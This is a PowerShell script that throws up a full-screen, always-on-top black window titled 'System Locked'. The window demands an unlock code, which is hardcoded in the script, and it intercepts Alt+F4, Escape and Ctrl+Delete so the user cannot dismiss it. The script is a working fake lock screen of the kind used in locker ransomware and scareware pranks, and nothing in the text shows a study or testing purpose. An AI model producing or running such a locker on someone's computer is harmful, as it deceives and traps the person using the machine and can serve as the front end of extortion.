Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create form
$form = New-Object System.Windows.Forms.Form
$form.Text = "System Locked"
$form.FormBorderStyle = "None"
$form.WindowState = "Maximized"
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black

# Create label
$label = New-Object System.Windows.Forms.Label
$label.Text = "Enter unlock code:"
$label.ForeColor = [System.Drawing.Color]::White
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(50, 50)
$form.Controls.Add($label)

# Create text box
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(50, 80)
$textBox.Width = 200
$textBox.Text = ""
$form.Controls.Add($textBox)

# Create button
$button = New-Object System.Windows.Forms.Button
$button.Text = "Unlock"
$button.Location = New-Object System.Drawing.Point(50, 110)
$button.Add_Click({
    if ($textBox.Text -eq "dcflush") {
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Incorrect code!", "Error")
    }
})
$form.Controls.Add($button)

# Block Alt+F4 and other key combinations
$form.KeyPreview = $true
$form.Add_KeyDown({
    if ($_.KeyCode -eq "F4" -and $_.Alt) {
        $_.Handled = $true
    }
    if ($_.KeyCode -eq "Escape" -or ($_.Control -and $_.KeyCode -eq "Delete")) {
        $_.Handled = $true
    }
})

# Show form
$form.ShowDialog()